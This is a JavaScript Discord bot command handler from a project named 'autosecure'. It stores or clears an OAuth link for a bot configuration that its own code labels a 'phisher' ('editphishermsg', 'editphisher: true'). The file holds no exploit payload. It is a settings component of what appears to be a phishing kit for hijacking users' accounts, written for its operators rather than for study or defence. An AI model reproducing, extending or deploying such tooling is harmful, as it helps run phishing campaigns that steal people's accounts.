const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "changeoauthmodal",
    editphisher: true,
    callback: async (client, interaction) => {
        try {
            const [t, botnumber, ownerid] = interaction.customId.split("|");

            let oauth = interaction.components[0].components[0].value.trim();


            if (oauth.length === 0) {
                await queryParams(
                    `UPDATE autosecure SET oauth_link = NULL WHERE user_id = ? AND botnumber = ?`,
                    [ownerid, botnumber]
                );
                const settingsResponse = await editphishermsg(botnumber, ownerid, interaction.user.id);
                settingsResponse.content = `✅ Removed your OAuth!`;
                return interaction.update(settingsResponse);
            }





            if (!isValidUrl(oauth)) {
                return interaction.update({
                    content: `❌ Invalid URL! Please enter a valid OAuth URL.`,
                    ephemeral: true
                });
            }


            await queryParams(
                `UPDATE autosecure SET oauth_link = ? WHERE user_id = ? AND botnumber = ?`,
                [oauth, ownerid, botnumber]
            );

            const settingsResponse = await editphishermsg(botnumber, ownerid, interaction.user.id);
            settingsResponse.content = `✅ Set your OAuth to: ${oauth}`;
            return interaction.update(settingsResponse);

        } catch (error) {
            console.error("Error in changeoauthmodal:", error);
            return interaction.update({
                content: `❌ An unexpected error occurred.`,
                ephemeral: true
            });
        }
    }
};

const isValidUrl = (urlString) => {
    try {
        new URL(urlString);
        return true;
    } catch {
        return false;
    }
};
